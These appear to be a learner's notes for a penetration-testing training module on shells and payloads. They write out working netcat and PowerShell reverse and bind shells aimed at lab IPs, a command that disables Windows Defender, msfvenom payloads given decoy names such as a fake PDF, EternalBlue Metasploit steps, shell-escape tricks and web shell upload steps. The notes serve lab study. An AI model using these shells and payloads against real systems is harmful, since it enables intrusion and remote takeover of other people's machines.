# Shells and Payloads

#PoppinShells

# CAT5 Security's Engagement Preparation
### SHell basics
    replicate being able to get a bind and reverse shel
    bind shell on Linux host
    Reverse Shell on Windows Host
### Payload Basics
    Demonstrate launching a payload from MSF
    Demonstrate searching and building a payload from PoC on ExploitDB
    Demonstrate knowledge of payload creation

### Getting Shell on Windows
    Using the recon results provided, craft or use a payload that will exploit the host and provide a shell back.
### Getting shell on linux
    Using the recon results provided, craft or use a payload to exploit the host and establish a shell session.

### Landing a Web Shell 
    Demonstrate knowledge of web shells and common web applications by identifying a common web application and its corresponding language
    Using the recon results provided, deploy a payload that will provide shell access from you browser
### Spotting a shell or Payload
    Detect the presence of a payload or interactive shell on a host by analyzing relevant information provided.
### Final challange
    Utilize knowledge gained from the previous sections to select, craft, and deploy a payload to access the provided hosts. Once a shell has been acquired, grab the requested information to answer the challenge questions. 

### Anatonomy
```bash
# shell validation
ps

# shell path
env

# In powershell
$PSVersionTable
```

# Bind Shells
A listener would need to have been started on the target
`nc` can be considered our swiss-army knife. 

```bash
# Listening w. netcat (from target)
nc -lvnp 7777

# Attack box
nc -nv <IP> 7777
```

### Establishing a basic BIND shell wihh Netcat
```bash
# From target
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

# The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.

Back on the client, use Netcat to connect to the server now that a shell on the server is being served.

# From our machine
zirap98@htb[/htb]$ nc -nv 10.129.41.200 7777
```

# Reverse Shells
```bash
# On attack machine
sudo nc -lvnp 443

# On our windows target
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# We might get blocket by AntiVirus so to disable:
Set-MpPreference -DisableRealtimeMonitoring $true

# Now that it is disabled, let's go again
sudo nc -lvnp 443
```

# Introduction to payloads
### Netcat/Bash Reverse Shell One-liner
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

# The commands above make up a common one-liner issued on a Linux system to serve a Bash shell on a network socket utilizing a Netcat listener. We used this earlier in the Bind Shells section. It's often copied & pasted but not often understood. Let's break down each portion of the one-liner:

rm -f /tmp/f; 
# Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequentially.

# Make A Named Pipe
mkfifo /tmp/f; 

# Makes a FIFO named pipe file at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command sequentially.
# Output Redirection
cat /tmp/f | 

# Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|).

# Set Shell Options
/bin/bash -i 2>&1 | 

# Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard output data stream (1) are redirected to the command following the pipe (|).

# Open a Connection with Netcat
nc 10.10.14.12 7777 > /tmp/f  
```
Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777. The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed


### PowerShell One-liner Explained
```powershell
# Dissect this complex pob
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Calling PowerShell
powershell -nop -c 
```
Executes `powershell.exe` with no profile (`nop`) and executes the command/script block (-c) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in `cmd.exe.`

```powershell
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,433);

```
Sets/evaluates the variable `$client` equal to (=) the `New-Object` cmdlet, which creates an instance of the `System.Net.Sockets.TCPClient` .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses `(10.10.14.158,443)`. The semi-colon (;) ensures the commands & code are executed sequentially.

```powershell
$stream = $client.GetStream();

# Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications. The semi-colon (;) ensures the commands & code are executed sequentially.

# Empty Byte Stream
[byte[]]$bytes = 0..65535|%{0}; 
# Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.

# Stream Parameters
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)

# Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read ($stream.Read) method. The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.

# Set The Byte Encoding
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```
Sets/evaluates the variable `$data` equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the `GetString` method to encode the byte stream ($bytes) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (;) ensures the commands & code are executed sequentially.
```powershell
# Invoke-Expression
$sendback = (iex $data 2>&1 | Out-String ); 
```
Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard output (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (;) ensures the commands & code are executed sequentially.

```powershell
# Show Working Directory
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 

```
Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard output (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (;) ensures the commands & code are executed sequentially.

```powershell
# Sets Sendbyte
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
# Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.

#Terminate TCP Connection
$client.Close()"
```

This is the TcpClient.Close method that will be used when the connection is terminated.

The one-liner we just examined together can also be executed in the form of a PowerShell script (.ps1). We can see an example of this by viewing the source code below. This source code is part of the [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) project:

```powershell

```

Reverse shells are more easily reached by using metasploit framework

# Automating Payloads & Delivery with Metasploit
We can see there is creative ASCII art presented as the banner at launch and some numbers of particular interest.

    2131 exploits
    592 payloads

### Scenario:
we perform a basic nmap scan: `nmap -sC -sV -Pn 10.129.164.25`

`445/tcp  open  microsoft-ds` is open (SMB). we can search in `msf` with `search smb`. 
We use: `56 exploit/windows/smb/psexec`
56 	The number assigned to the module in the table within the context of the search. This number makes it easier to select. We can use the command use 56 to select the module.
    exploit/ 	This defines the type of module. In this case, this is an exploit module. Many exploit modules in MSF include the payload that attempts to establish a shell session.
    windows/ 	This defines the platform we are targeting. In this case, we know the target is Windows, so the exploit and payload will be for Windows.
    smb/ 	This defines the service for which the payload in the module is written.
    psexec 	This defines the tool that will get uploaded to the target system if it is vulnerable.

# Crafting Payloads with MSFvenom
In Pwnbox or any host with MSFvenom installed, we can issue the command `msfvenom -l` payloads to list all the available payloads. Below are just some of the payloads available. A few payloads have been redacted to shorten the output and not distract from the core lesson. Take a close look at the payloads and their descriptions:

`msfvenom -l payloads`

### Staged vs Unstaged payload
Staged and unstaged payloads have respective advantages, a staged is smaller and lower chance of detection but is often less stabel. A stageless payload comes as one package but is larger, have a higher chance of detection. They follow the naming scheme:
```bash
# Unstaged
windows/meterpreter_reverse_tcp

# Staged
windows/meterpreter/reverse_tcp
```

### Let's build a payload
build it:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf`

Dissect it:
`msfvenom` is the framework, `-p` create payload, `linux/x64/shell_reverse_tcp `, choose payload based on Architecture, `LHOST=10.10.14.113 LPORT=443 `, Address to connect back to, `-f elf ` format to generate Payload in (The -f flag specifies the format the generated binary will be in. In this case, it will be an .elf file). `> createbackup.elf` output.

### Executing a Stageless Payload
    Email message with the file attached.
    Download link on a website.
    Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
    Via flash drive as part of an onsite penetration test.

### Building a simple Stageless Payload for a Windows system
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe`

### Executing a Simple Stageless Payload On a Windows System
This is another situation where we need to be creative in getting this payload delivered to a target system. Without any encoding or encryption, the payload in this form would almost certainly be detected by Windows Defender AV.

# Infiltrating Windows
### Dominant exploits
Vulnerability 	Description
`MS08-067` 	MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.
`Eternal Blue` 	MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.
`PrintNightmare` 	A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it here.
`BlueKeep` 	CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.
`Sigred` 	CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.
`SeriousSam` 	CVE 2021-36924 exploits an issue with the way Windows handles permission on the C:\Windows\system32\config folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.
`Zerologon` 	CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.


### Enumerating windows & Fingerprinting methods
We can run a couple different scans but let's start with:
`sudo nmap -v -O <IP>`

Whereby we grab the banner:
`sudo nmap -v <IP> --script banner.nse`

From that we can determin the host is a Windows machine. 

### Bats, DLLs, & MSI Files, Oh My!
Payload Types to Consider

- `DLLs A Dynamic Linking Library (DLL)` is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.

- `Batch` Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of .bat. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.

- `VBS` VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.

- `MSI` .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell.

- `Powershell` Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.

### Common Payload generation:
`MSFVenom & Metasploit-Framework `	Source MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.
`Payloads All The Things` 	Source Here, you can find many different resources and cheat sheets for payload generation and general methodology.
`Mythic C2 Framework` 	Source The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.
`Nishang` 	Source Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.
`Darkarmour` 	Source Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.

# Payload Transfer & Execution:

- `Impacket`: Impacket is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with psexec, smbclient, wmi, Kerberos, and the ability to stand up an SMB server.
- `Payloads All The Things`: is a great resource to find quick oneliners to help transfer files across hosts expediently.
- `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.

Scan for eternal blue, use:
`auxiliary/scanner/smb/smb_ms17_010`

From the initial enumeration of the host, we can determine it's running `Windows Servere 2016 Standard 6.3`. lets check if it's succeptible to Ethernal Blue: `use auxiliary/scanner/smb/smb_ms17_010`. 
We now know it is succeptible, `search eternal` in `msfconsole`. Let's use `exploit/windows/smb/ms17_010_psexec` and set appropriate options. 

### Which shell to use?
Use CMD when:

    You are on an older host that may not include PowerShell.
    When you only require simple interactions/access to the host.
    When you plan to use simple batch files, net commands, or MS-DOS native tools.
    When you believe that execution policies may affect your ability to run scripts or other actions on the host.

Use PowerShell when:

    You are planning to utilize cmdlets or other custom-built scripts.
    When you wish to interact with .NET objects instead of text output.
    When being stealthy is of lesser concern.
    If you are planning to interact with cloud-based services and hosts.
    If your scripts set and use Aliases.


# Infiltrating Unix/Linux
### Common considerations:


    What distribution of Linux is the system running?

    What shell & programming languages exist on the system?

    What function is the system serving for the network environment it is on?

    What application is the system hosting?

    Are there any known vulnerabilities?

If there is no package available in msfconsol, we can download from GH. We put the exploit in `/usr/share/metasploit-framework/modules/exploits/linux/http`. Thereafter it can be found by msfconsole. 
`use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`

To upgrade from `non-tty shell`, use: `python -c 'import pty; pty.spawn("/bin/sh")' `

# Spawning Interactive Shells
```bash
# perl -e
perl —e 'exec "/bin/sh";'

# Ruby
ruby: exec "/bin/sh"

# Lua
lua: os.execute('/bin/sh')

# AWK
awk 'BEGIN {system("/bin/sh")}'

# Find
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# Using Exec To Launch A Shell
find . -exec /bin/sh \; -quit

# vim
vim -c ':!/bin/sh'

# vim escape
vim
:set shell=/bin/sh
:shell

# Check permissions
sudo -l
```

# Web shells
### Laudanum, One Webshell to Rule Them All
Can be found in: `/usr/share/webshells/laudanum`

step 1: copy the required scripts to separate folder.
step 2: add your machine as an allowed host
step 3: upload

For a detailed explanation, visit [HTB academy](https://academy.hackthebox.com/module/115/section/1122)

You can also use:
`/usr/share/nishang/Antak-WebShell/antak.aspx`

Nicer since it is `powershell`

### PHP web shells
[WhiteWinterWolf](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
[HTB tutorial](https://academy.hackthebox.com/module/115/section/1120)

# Knowledge check
check for vulnerabilities
when using msfconsole, `set target`, `set payload` accordingly

We not only have to use eternal blue, we can also use: `(exploit/windows/smb/ms17_010_psexec)`

We can use:
`sudo nmap -sC -sV -Pn 172.16.11.1`
`sudo nmap -v 172.16.11.1 --scripts banner.nse`

